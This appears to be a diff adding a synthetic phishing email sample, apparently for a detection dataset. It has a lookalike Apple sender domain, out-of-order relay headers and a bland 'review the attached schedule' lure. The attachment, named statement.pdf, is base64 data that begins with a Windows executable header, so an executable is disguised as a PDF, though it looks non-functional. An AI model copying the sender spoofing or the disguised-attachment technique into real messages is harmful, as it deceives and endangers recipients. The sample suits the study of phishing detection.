@@ -1,0 +1,50 @@
+From: notice@apple-verify.top
+To: victim1@example.com
+Subject: Meeting notes for the west power desk [ref A398FA1]
+Date: Tue, 26 Mar 2002 15:24:00 -0500
+Message-ID: <phish-241-a71bda77-e291-4a7a-aae4-d0f0928a6b4b@apple-verify.top>
+Received: from relay0 (relay0.example.net [192.0.2.100]) by mx0.example.com; Tue, 04 Mar 2002 10:05:00 -0500
+Received: from relay1 (relay1.example.net [192.0.2.101]) by mx1.example.com; Tue, 06 Mar 2002 16:08:00 -0500
+Received: from relay2 (relay2.example.net [192.0.2.102]) by mx2.example.com; Tue, 01 Mar 2002 21:45:00 -0500
+Received: from relay3 (relay3.example.net [192.0.2.103]) by mx3.example.com; Tue, 03 Mar 2002 16:32:00 -0500
+Received: from relay4 (relay4.example.net [192.0.2.104]) by mx4.example.com; Tue, 08 Mar 2002 01:22:00 -0500
+Received: from relay5 (relay5.example.net [192.0.2.105]) by mx5.example.com; Tue, 17 Mar 2002 15:22:00 -0500
+Received: from relay6 (relay6.example.net [192.0.2.106]) by mx6.example.com; Tue, 28 Mar 2002 10:58:00 -0500
+Received: from relay7 (relay7.example.net [192.0.2.107]) by mx7.example.com; Tue, 16 Mar 2002 10:08:00 -0500
+Return-Path: <notice@apple-verify.top>
+Reply-To: notice@apple-verify.top
+Authentication-Results: mx.example.com; spf=pass smtp.mailfrom=apple-verify.top; dkim=pass header.d=apple-verify.top; dmarc=pass header.from=apple-verify.top
+Received-SPF: pass (mx.example.com: domain of notice@apple-verify.top designates 192.0.2.21 as permitted sender)
+DKIM-Signature: v=1; a=rsa-sha256; d=apple-verify.top; s=default; h=from:to:subject;
+MIME-Version: 1.0
+Content-Type: multipart/mixed; boundary="bnd-p-241-b50ecfc0"
+
+--bnd-p-241-b50ecfc0
+Content-Type: text/plain; charset="UTF-8"
+
+Hi,
+
+Please review the attached schedule before Friday. No action needed beyond that.
+Reference: A398FA1
+
+Thanks,
+Colleague
+--bnd-p-241-b50ecfc0
+Content-Type: application/pdf; name="statement.pdf"
+Content-Transfer-Encoding: base64
+Content-Disposition: attachment; filename="statement.pdf"
+
+TVqQAICzZtmLnVZIWro+CS7xrmWoE8BaZAzxZQkhdioSMbi/INd8DUT7HwVZZNKPbWqZ0G2LYFiN
+mzr82fnlMFBPQ4iz2CPE2AE5WFx/t6LOPuZ5pJZeX7QlYHveL7txPnKl40ZmhOGdNka1y9qHoDxz
+krAL4wzneRzHwtC+F8w7pRPu6whW6xgdvPKM28+z9Bkqlp1qINye/IjXypuXIf8dX7X/S3xzxRnV
+vxHewoViGzVGWcCWpmhTDlCx05Su7MdiURBfzt69xnUVqSWhcI60QBPhJ+zLL5Xe2gNtWDEswTFY
+1K9uAMljdQZ+3WimgQbhP2jAPqmQLgx0qKzfNg0row2z4UkRVKzicsquMdA7TlnNeYHGxr9V280v
+F4IpJeWj4mvKLYHAw580wWPZq6g/OswXRyg/hhwNSQDXLJe5nsq5Q9X7GqySASa2HV0UGfaYs6mq
+Ls1iSl81DuWMMuzXzndZVXwHjy/Om+SZeR3HF01JP/xR4E5vsKBshroIMzQ6WoBSTypDxCy+hQkE
+idSGyouz9a5ZpbdbXmmg43GKvO+dNjtzU/J2/VaD+4JPWUHtKBKUx1i5BjS1k1hvPO90+t8vE/HL
+580senfUfI704XD74bWzpILQvTA6gSKSqNwz2PGKIbjEHF6nSVcOfFoyVxe8zRwx+TH/IN9kuhLH
+yyXWDYgP3p9tmcYSxTfVcXX708BkozaYyZY+G1GPpnUxy4Fiqnc0g2tTl6wEYzJwvRNpTrMeZHrY
+ZwGBhKmPgzSXaAEs5NXUz3ACemGz7H70UZSnADCypRmFE+rc2zDANUDcHMtpyhvNqtrmXITuXvYS
+vtggx0L34cB0wt9PDA==
+
+--bnd-p-241-b50ecfc0--
